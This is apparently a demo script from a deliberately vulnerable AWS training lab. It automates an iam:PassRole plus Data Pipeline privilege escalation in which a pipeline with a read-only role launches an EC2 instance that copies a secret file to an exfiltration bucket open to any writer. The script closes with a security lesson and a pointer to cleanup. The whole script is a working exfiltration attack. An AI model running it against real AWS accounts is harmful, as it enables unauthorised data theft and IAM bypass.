#!/bin/bash

# Demo script for iam:PassRole + Data Pipeline privilege escalation to S3 bucket
# This script demonstrates how a user with iam:PassRole and Data Pipeline permissions
# can exfiltrate S3 data using a read-only role by bypassing IAM via resource policy

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-datapipeline-001-to-bucket-starting-user"
PIPELINE_ROLE="pl-prod-datapipeline-001-to-bucket-pipeline-role"
PIPELINE_NAME="pl-datapipeline-001-exfil-pipeline"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Data Pipeline Resource Policy Bypass Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_iam_passrole_datapipeline_pipeline.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and bucket names from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
SENSITIVE_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.sensitive_bucket_name')
EXFIL_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.exfil_bucket_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "Sensitive Bucket: $SENSITIVE_BUCKET"
echo "Exfiltration Bucket: $EXFIL_BUCKET"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have direct bucket access
echo -e "${YELLOW}Step 4: Verifying we don't have direct access to sensitive bucket${NC}"
echo "Attempting to read sensitive data directly (should fail)..."
if aws s3 cp s3://$SENSITIVE_BUCKET/secret-data.txt - 2>/dev/null; then
    echo -e "${RED}⚠ Unexpectedly have direct bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access sensitive bucket directly (as expected)${NC}"
fi
echo ""

# Step 5: Verify pipeline role has NO write permissions (optional verification)
echo -e "${YELLOW}Step 5: Understanding the privilege escalation vector${NC}"
echo "The pipeline role has:"
echo "  - s3:GetObject on the sensitive bucket (READ-ONLY)"
echo "  - NO s3:PutObject permissions in IAM"
echo ""
echo "However, the exfiltration bucket has a resource policy that allows:"
echo "  - ANY principal to write (bypassing IAM restrictions!)"
echo ""
echo -e "${BLUE}This demonstrates how resource policies can bypass IAM restrictions${NC}"
echo ""

# Step 6: Create Data Pipeline
echo -e "${YELLOW}Step 6: Creating Data Pipeline${NC}"
echo "Pipeline name: $PIPELINE_NAME"

PIPELINE_ID=$(aws datapipeline create-pipeline \
    --region $AWS_REGION \
    --name "$PIPELINE_NAME" \
    --unique-id "datapipeline-$(date +%s)" \
    --query 'pipelineId' \
    --output text)

echo "Pipeline ID: $PIPELINE_ID"
echo -e "${GREEN}✓ Successfully created Data Pipeline${NC}\n"

# Step 7: Create pipeline definition with exfiltration command
echo -e "${YELLOW}Step 7: Creating pipeline definition with exfiltration command${NC}"
echo "Creating pipeline definition that will:"
echo "  1. Launch an EC2 instance with the pipeline role"
echo "  2. Copy sensitive data from $SENSITIVE_BUCKET"
echo "  3. Write to $EXFIL_BUCKET (bypassing IAM via resource policy)"
echo ""

# Create the pipeline definition JSON
PIPELINE_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PIPELINE_ROLE}"

# Get a default resource role for the pipeline infrastructure
RESOURCE_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PIPELINE_ROLE}"

cat > /tmp/pipeline_definition.json << EOF
{
  "objects": [
    {
      "id": "Default",
      "name": "Default",
      "scheduleType": "ONDEMAND",
      "failureAndRerunMode": "CASCADE",
      "role": "$PIPELINE_ROLE_ARN",
      "resourceRole": "$RESOURCE_ROLE_ARN"
    },
    {
      "id": "ExfilActivity",
      "name": "ExfilActivity",
      "type": "ShellCommandActivity",
      "command": "aws s3 cp s3://$SENSITIVE_BUCKET/secret-data.txt s3://$EXFIL_BUCKET/exfiltrated.txt --region $AWS_REGION",
      "runsOn": {
        "ref": "ExfilResource"
      }
    },
    {
      "id": "ExfilResource",
      "name": "ExfilResource",
      "type": "Ec2Resource",
      "instanceType": "t3.micro",
      "terminateAfter": "30 Minutes",
      "securityGroups": "default"
    }
  ]
}
EOF

echo -e "${GREEN}✓ Pipeline definition created${NC}\n"

# Step 8: Put pipeline definition
echo -e "${YELLOW}Step 8: Uploading pipeline definition${NC}"

aws datapipeline put-pipeline-definition \
    --region $AWS_REGION \
    --pipeline-id "$PIPELINE_ID" \
    --pipeline-definition file:///tmp/pipeline_definition.json \
    --output json > /tmp/pipeline_put_result.json

# Check if the pipeline definition was accepted
VALIDATION_ERRORS=$(cat /tmp/pipeline_put_result.json | jq -r '.validationErrors // [] | length')

if [ "$VALIDATION_ERRORS" != "0" ]; then
    echo -e "${RED}Error: Pipeline definition has validation errors${NC}"
    cat /tmp/pipeline_put_result.json | jq '.validationErrors'
    rm -f /tmp/pipeline_definition.json /tmp/pipeline_put_result.json
    aws datapipeline delete-pipeline --region $AWS_REGION --pipeline-id "$PIPELINE_ID"
    exit 1
fi

echo -e "${GREEN}✓ Pipeline definition uploaded successfully${NC}\n"

# Step 9: Activate pipeline
echo -e "${YELLOW}Step 9: Activating the pipeline${NC}"
echo "This will launch an EC2 instance and execute the exfiltration command..."

aws datapipeline activate-pipeline \
    --region $AWS_REGION \
    --pipeline-id "$PIPELINE_ID" \
    --output json > /dev/null

echo -e "${GREEN}✓ Pipeline activated${NC}\n"

# Step 10: Wait for pipeline execution
echo -e "${YELLOW}Step 10: Waiting for pipeline to execute${NC}"
echo "The pipeline will:"
echo "  1. Launch an EC2 instance (takes ~30-45 seconds)"
echo "  2. Execute the exfiltration command"
echo "  3. Copy the sensitive data to the exfil bucket"
echo ""
echo "Waiting 60 seconds for EC2 instance launch and execution..."

# Wait with progress indicators
for i in {1..60}; do
    echo -n "."
    sleep 1
    if [ $((i % 10)) -eq 0 ]; then
        echo -n " ${i}s"
    fi
done
echo ""
echo -e "${GREEN}✓ Wait complete${NC}\n"

# Step 11: Verify exfiltration was successful
echo -e "${YELLOW}Step 11: Verifying exfiltration was successful${NC}"
echo "Checking if the data was exfiltrated to the exfil bucket..."

# First check if the file exists
if aws s3 ls s3://$EXFIL_BUCKET/exfiltrated.txt --region $AWS_REGION &> /dev/null; then
    echo -e "${GREEN}✓ Exfiltrated file found in bucket!${NC}"
    echo ""
else
    echo -e "${YELLOW}⚠ Exfiltrated file not yet available. The pipeline may still be executing.${NC}"
    echo "You can check the pipeline status with:"
    echo "  aws datapipeline list-runs --region $AWS_REGION --pipeline-id $PIPELINE_ID"
    echo ""
    echo -e "${YELLOW}Waiting an additional 30 seconds...${NC}"
    sleep 30
fi

# Step 12: Read the exfiltrated data
echo -e "${YELLOW}Step 12: Reading the exfiltrated sensitive data${NC}"
echo "Retrieving the exfiltrated file from: s3://$EXFIL_BUCKET/exfiltrated.txt"
echo ""

if aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region $AWS_REGION 2>/dev/null; then
    echo ""
    echo -e "${GREEN}✓ Successfully read exfiltrated sensitive data!${NC}"
    echo -e "${GREEN}✓ BUCKET ACCESS ACHIEVED VIA RESOURCE POLICY BYPASS${NC}"
else
    echo -e "${YELLOW}⚠ Could not read exfiltrated data yet${NC}"
    echo "The pipeline execution may take longer. Check back in a few minutes."
    echo ""
    echo "To manually check the exfiltration status:"
    echo "  aws s3 ls s3://$EXFIL_BUCKET/ --region $AWS_REGION"
    echo "  aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region $AWS_REGION"
fi
echo ""

# Clean up temporary files
rm -f /tmp/pipeline_definition.json /tmp/pipeline_put_result.json

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole and Data Pipeline permissions)"
echo "2. Created Data Pipeline with read-only S3 role: $PIPELINE_ROLE"
echo "3. Pipeline launched EC2 instance with the role attached"
echo "4. EC2 instance read sensitive data from: $SENSITIVE_BUCKET"
echo "5. EC2 instance wrote to exfil bucket: $EXFIL_BUCKET"
echo "6. Write succeeded despite role having NO IAM write permissions!"
echo "7. Retrieved exfiltrated data from the exfil bucket"
echo "8. Achieved: Access to sensitive bucket data"

echo -e "\n${BLUE}Key Security Lesson:${NC}"
echo "The pipeline role had s3:GetObject (READ-ONLY) permissions in IAM."
echo "However, the exfiltration bucket's RESOURCE POLICY allowed writes."
echo "Resource policies can BYPASS IAM restrictions!"
echo ""
echo -e "${RED}This demonstrates why both IAM policies AND resource policies must be secured.${NC}"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (CreatePipeline + PassRole)"
echo -e "  → Data Pipeline with $PIPELINE_ROLE (read-only S3 in IAM)"
echo -e "  → EC2 Instance → Read from $SENSITIVE_BUCKET"
echo -e "  → Write to $EXFIL_BUCKET (bypassing IAM via resource policy)"
echo -e "  → Exfiltrated sensitive data accessed"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Data Pipeline: $PIPELINE_ID"
echo "- Pipeline Name: $PIPELINE_NAME"
echo "- EC2 Instance: (launched by pipeline, may still be running)"
echo "- Exfiltrated File: s3://$EXFIL_BUCKET/exfiltrated.txt"

echo -e "\n${RED}⚠ Warning: The Data Pipeline and EC2 instance may still be active${NC}"
echo -e "${RED}⚠ Active pipelines and EC2 instances incur charges${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
